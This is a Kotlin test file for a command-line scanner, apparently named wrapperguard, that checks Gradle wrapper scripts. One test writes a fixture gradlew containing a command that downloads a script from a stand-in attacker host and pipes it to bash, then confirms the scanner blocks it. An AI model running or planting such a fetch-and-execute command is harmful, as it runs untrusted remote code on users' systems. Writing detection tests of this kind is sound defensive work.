package com.sal7one.wrapperguard.cli

import java.io.ByteArrayOutputStream
import java.io.PrintStream
import java.nio.file.Files
import kotlin.test.*

class CliTest {
    @Test fun `flags do not accidentally become project directories`() {
        val options = CliOptions.parse(arrayOf("--providers", "/user/providers.json", "--operation", "sync", "/project", "--json"))
        assertEquals("/project", options.project.toString())
        assertEquals("/user/providers.json", options.providers.toString())
        assertEquals("SYNC", options.operation.name)
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--providers")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--operation", "publish")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--json", "--sarif")) }
    }

    @Test fun `built in adapter scans without external configuration and preserves exit two`() {
        val root = Files.createTempDirectory("wg-cli-fixture-")
        try {
            Files.writeString(root.resolve("gradlew"), "#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | bash\n")
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            val code = runCli(arrayOf(root.toString(), "--json", "--enforce"), PrintStream(stdout), PrintStream(stderr))
            assertEquals(2, code)
            assertTrue(stdout.toString().contains("\"providerRuns\""))
            assertTrue(stdout.toString().contains("EXECUTION_BLOCKED"))
            assertEquals("", stderr.toString())
        } finally { root.toFile().deleteRecursively() }
    }

    @Test fun `invalid configuration fails instead of silently falling back to built in scanning`() {
        val root = Files.createTempDirectory("wg-cli-config-fixture-")
        try {
            val config = Files.writeString(root.resolve("providers.json"), "{}")
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            assertEquals(1, runCli(arrayOf(root.toString(), "--providers", config.toString()), PrintStream(stdout), PrintStream(stderr)))
            assertEquals("", stdout.toString())
            assertTrue(stderr.toString().contains("could not complete"))
        } finally { root.toFile().deleteRecursively() }
    }
}
